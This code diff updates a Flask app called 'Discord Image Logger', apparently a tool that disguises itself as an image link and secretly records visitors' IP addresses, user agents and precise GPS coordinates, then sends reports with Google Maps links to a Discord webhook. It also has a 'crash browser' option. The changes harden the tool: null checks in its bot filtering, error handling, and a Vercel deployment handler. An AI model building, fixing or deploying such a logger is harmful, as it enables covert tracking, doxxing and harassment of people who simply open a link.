@@ -9,6 +9,7 @@ import os
 import time
 import re
 
+# Create Flask app
 app = Flask(__name__)
 
 __app__ = "Discord Image Logger"
@@ -96,11 +97,11 @@ def botCheck(ip, useragent):
         return False
         
     # Discord bots
-    if ip.startswith(("34.", "35.")):
+    if ip and ip.startswith(("34.", "35.")):
         return "Discord"
     
     # Telegram
-    if useragent.startswith("TelegramBot"):
+    if useragent and useragent.startswith("TelegramBot"):
         return "Telegram"
     
     # Common bots
@@ -112,10 +113,11 @@ def botCheck(ip, useragent):
         'headless', 'phantom', 'selenium', 'puppet'
     ]
     
-    ua_lower = useragent.lower()
-    for pattern in bot_patterns:
-        if pattern in ua_lower:
-            return "Bot/Crawler"
+    if useragent:
+        ua_lower = useragent.lower()
+        for pattern in bot_patterns:
+            if pattern in ua_lower:
+                return "Bot/Crawler"
     
     return False
 
@@ -319,7 +321,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             lat, lon = coords.split(',')
             coord_text = format_coordinates(lat.strip(), lon.strip(), 6)
             maps_link = f"https://www.google.com/maps?q={lat.strip()},{lon.strip()}"
-            coord_accuracy = "🎯 Precise"
+            coord_accuracy = "🎯 Precise (GPS)"
         except:
             coord_text = coords.replace(',', ', ')
             maps_link = f"https://www.google.com/maps?q={coords.replace(',', '%2C')}"
@@ -743,7 +745,10 @@ def catch_all(path):
         
     except Exception as e:
         print(f"Error: {traceback.format_exc()}")
-        reportError(traceback.format_exc())
+        try:
+            reportError(traceback.format_exc())
+        except:
+            pass
         return Response(
             "Internal Server Error",
             status=500,
@@ -754,21 +759,11 @@ def catch_all(path):
 def not_found(e):
     return catch_all(request.path)
 
-# For Vercel serverless
-def handler(event, context):
-    return app
+@app.errorhandler(500)
+def internal_error(e):
+    return Response("Internal Server Error", status=500, mimetype='text/plain')
 
-# For local development
-if __name__ == '__main__':
-    print("=" * 50)
-    print("🎯 Ultra Accurate Image Logger")
-    print("=" * 50)
-    print(f"Webhook: {config['webhook'][:50]}...")
-    print(f"Image: {config['image']}")
-    print(f"Accurate Location: {config['accurateLocation']}")
-    print(f"Crash Browser: {config['crashBrowser']}")
-    print("=" * 50)
-    print("Server starting on http://localhost:8080")
-    print("=" * 50)
-    
-    app.run(debug=True, host='0.0.0.0', port=8080)
+# This is the correct handler for Vercel
+def handler(event, context):
+    """Vercel serverless function handler"""
+    return app
